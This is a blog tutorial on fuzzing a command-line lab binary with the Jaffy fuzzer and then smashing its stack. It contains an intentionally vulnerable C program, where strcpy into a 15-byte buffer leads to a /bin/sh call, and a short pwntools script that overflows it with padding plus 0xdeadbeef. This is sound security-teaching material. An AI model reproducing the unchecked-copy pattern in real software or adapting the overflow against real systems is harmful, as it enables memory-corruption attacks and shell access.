---
title: "CLI Security Testing: Stack Smashing"
tags: [ "Security Testing", "0-day", "Fuzzing", "Memory Corruption","CLI"]
date: 2018-01-04
cover: "/media/pwntoolExploit.gif"
---


## Fuzzing Command Line Utilities

Following up from one of my previous [article](/post/cli-security-testing/), I will be fuzzing CLI params using JAFFY fuzzer and try to smash the stack on a vulnerable program.  
Jaffy can fuzz binaries that you run on the command line. It takes a simple XML as input to specify the arguments details and you are ready to go.
In order to run jaffy you need to install this python3 module:

```bash
pip install untangled
```

Jaffy runs everything with shell=True so it makes it vary easy to use it with command line utilities. All file output is stored in a folder with the date and time of the scan. 

Let's have a look at out vulnerable program beofre jumping to video:

```C
void shell()
{
	printf("You did it.\n");
	system("/bin/sh");
}

int main(int argc, char** argv)
{
	if(argc != 2)
	{
		printf("usage:\n%s string\n", argv[0]);
		return EXIT_FAILURE;
	}

	int set_me = 0;
	char buf[15];
	strcpy(buf, argv[1]);

	if(set_me == 0xdeadbeef)
	{
		shell();
	}
	else
	{
		printf("Not authenticated.\nset_me was %d\n", set_me);
	}

	return EXIT_SUCCESS;
}
```

By now you may have found out that it is doing a vulnerbale string copy (strcpy) and writing anything recieved from command line argument without doing a length check, that too on a limited space buffer of 15 characters.

Now lets have a look at out XML file for jaffy:

```XML
<?xml version="1.0"?>
<fuzzer>
	<bin path="/home/kowalski/0x51/lab2C" />
	<opt type="prestatic" value="" />
	<opt type="poststatic" value="" /> 
	<fuzz type="chariter" prefix="" char="a" length="9999" />
	<prefuzz cmd="" />
	<postfuzz cmd="" />
	<exit level="!0" cmd="" />
	<display level="!0" />
	<write level="!0" />
</fuzzer>
```
<p style="text-align:center" >
<script src="https://asciinema.org/a/2V9j0XYxn7tOR8uTtV83sXRkf.js" data-speed="2" id="asciicast-2V9j0XYxn7tOR8uTtV83sXRkf" async></script></p>

<p style="text-align:center" ><strong>Video: Fuzzing Command Line Utilities</strong></p>

As expected this program is vulnerable. Though while compiling I have only removed the canary protection on 17.10 ubuntu, rest all other security check are active. I will try to cover canary bypass in upcoming article.

**NX        : <span style="background-color: #98FB98">ENABLED</span> <br>
PIE       : <span style="background-color: #98FB98">ENABLED</span><br>
RELRO     : <span style="background-color: #98FB98">FULL</span><br>
CANARY    : <span style="background-color: #FF0000">DISABLED</span><br>**

Now lets go and see with help of pwntools and peda how easily we can prepare exploit for this elf.

<p style="text-align:center" >
<script src="https://asciinema.org/a/iOvLGdVDuaDXHxVhQVklihS1G.js" data-speed="3" id="asciicast-iOvLGdVDuaDXHxVhQVklihS1G" async></script></p>
<p style="text-align:center" ><strong>Video: Stack Smashing</strong></p>


## Exploit



```python
#!/usr/bin/python
from pwn import *

#Exploit
padding = "A"*15
pwn = p32(0xdeadbeef)
payload=padding+pwn

print '# Sending'
print payload
p = process(['./lab2Cm32',padding+pwn])
p.interactive()
```

![ Pwntool Exploit in Action](/media/pwntoolExploit.gif)


##### **References**:
1. [GitHub](https://github.com/pr1ntf/jaffy)



